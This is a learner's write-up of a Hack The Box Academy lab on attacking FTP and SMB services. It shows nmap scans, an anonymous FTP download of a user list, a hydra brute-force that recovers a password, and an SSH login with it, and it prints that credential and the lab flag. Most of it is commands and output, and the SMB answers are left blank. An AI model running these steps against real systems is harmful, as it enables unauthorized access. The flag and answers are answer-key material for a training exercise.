# Attacking Common Services
* Source: [Hack the Box: Academy](https://academy.hackthebox.com/)
* Module: Attacking Common Services
* Tier: II
* Difficulty: Medium
* Category: Offensive
* Time estimate: 8 hours
* Date: DD-MM-YYYY
* Author: [DjikstraCS](https://github.com/DjikstraCS)

---
## Attacking FTP
### Question 1:
![](./attachments/Pasted%20image%2020221114140322.png)

```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -n -sC -sV 10.129.97.86        
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-14 08:17 EST
Stats: 0:02:15 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 80.00% done; ETC: 08:20 (0:00:34 remaining)
Stats: 0:02:26 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 80.00% done; ETC: 08:20 (0:00:36 remaining)
Nmap scan report for 10.129.97.86
Host is up (0.044s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE      VERSION
22/tcp   open  ssh          OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 7108b0c4f3ca9757649770f9fec50c7b (RSA)
|   256 45c3b51463993d9eb32251e59776e150 (ECDSA)
|_  256 2ec2416646efb68195d5aa3523945538 (ED25519)
53/tcp   open  domain       ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
139/tcp  open  netbios-ssn  Samba smbd 4.6.2
445/tcp  open  netbios-ssn  Samba smbd 4.6.2
2121/tcp open  ccproxy-ftp?
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (InlaneFTP) [10.129.97.86]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port2121-TCP:V=7.93%I=7%D=11/14%Time=6372400B%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,8B,"220\x20ProFTPD\x20Server\x20\(InlaneFTP\)\x20\[10\.129\
SF:.97\.86\]\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20crea
SF:tive\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20creative\
SF:r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: -1s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: ATTCSVC-LINUX, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| smb2-time: 
|   date: 2022-11-14T13:20:34
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 177.76 seconds
```

**Answer:** `2121`

### Question 2:
![](./attachments/Pasted%20image%2020221114140352.png)

```
┌──(kali㉿kali)-[~]
└─$ ftp -p 10.129.106.151 2121
Connected to 10.129.106.151.
220 ProFTPD Server (InlaneFTP) [10.129.106.151]
Name (10.129.106.151:kali): anonymous
331 Anonymous login ok, send your complete email address as your password
Password: 
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls /
229 Entering Extended Passive Mode (|||60189|)
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 ftp      ftp          1959 Apr 19  2022 passwords.list
-rw-rw-r--   1 ftp      ftp            72 Apr 19  2022 users.list
226 Transfer complete
ftp> cat users.list
?Invalid command.
ftp> get users.list
local: users.list remote: users.list
229 Entering Extended Passive Mode (|||39757|)
150 Opening BINARY mode data connection for users.list (72 bytes)
    72        1.49 MiB/s 
226 Transfer complete
72 bytes received in 00:00 (0.73 KiB/s)
ftp> 
zsh: suspended  ftp -p 10.129.106.151 2121
  
┌──(kali㉿kali)-[~]
└─$ cat users.list                                                                         
root
robin
adm
admin
administrator
MARRY
jason
sa
dbuser
pentest
marlin
```

**Answer:** `robin`

### Question 3:
![](./attachments/Pasted%20image%2020221114140400.png)

```
┌──(kali㉿kali)-[~]
└─$ hydra -l robin -P passwords.list ftp://10.129.106.151 -s 2121
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-11-15 06:14:06
[DATA] max 16 tasks per 1 server, overall 16 tasks, 250 login tries (l:1/p:250), ~16 tries per task
[DATA] attacking ftp://10.129.106.151:2121/
[2121][ftp] host: 10.129.106.151   login: robin   password: 7iz4rnckjsduza7
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-11-15 06:14:52
```

SSH user:pass `robin:7iz4rnckjsduza7`

```
┌──(kali㉿kali)-[~]
└─$ sudo ssh robin@10.129.95.45
The authenticity of host '10.129.95.45 (10.129.95.45)' can't be established.
ED25519 key fingerprint is SHA256:HfXWue9Dnk+UvRXP6ytrRnXKIRSijm058/zFrj/1LvY.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.95.45' (ED25519) to the list of known hosts.
robin@10.129.95.45's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-109-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue 15 Nov 2022 11:21:42 AM UTC

  System load:  0.33               Processes:               261
  Usage of /:   28.4% of 13.72GB   Users logged in:         0
  Memory usage: 13%                IPv4 address for ens160: 10.129.95.45
  Swap usage:   0%

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

1 update can be applied immediately.
1 of these updates is a standard security update.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

$ ls
flag.txt
$ cat flag.txt
HTB{ATT4CK1NG_F7P_53RV1C3}
```

**Answer:** `HTB{ATT4CK1NG_F7P_53RV1C3}`

---
## Attacking SMB
### Question 1:
![](./attachments/Pasted%20image%2020221115131350.png)

```
┌──(kali㉿kali)-[~]
└─$ sudo nmap 10.129.95.51 -sV -sC -p139,445                 
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-15 07:10 EST
Nmap scan report for 10.129.95.51
Host is up (0.042s latency).

PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2

Host script results:
|_nbstat: NetBIOS name: ATTCSVC-LINUX, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| smb2-time: 
|   date: 2022-11-15T12:11:04
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.66 seconds

┌──(kali㉿kali)-[~]
└─$ smbmap -H 10.129.95.51
[+] IP: 10.129.95.51:445        Name: 10.129.95.51                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        GGJ                                                     READ ONLY       Priv
        IPC$                                                    NO ACCESS       IPC Service (attcsvc-linux Samba)
```

**Answer:** `GGJ`

### Question 2:
![](./attachments/Pasted%20image%2020221115131357.png)
*Hint: A colleague has shared with us a password list that we can find in the resource. He was able to compile this during his research.*


**Answer:** ``

### Question 3:
![](./attachments/Pasted%20image%2020221115131404.png)

**Answer:** ``

---
## 
### Question:


**Answer:** ``

---
**Tags:** [[Hack The Box Academy]]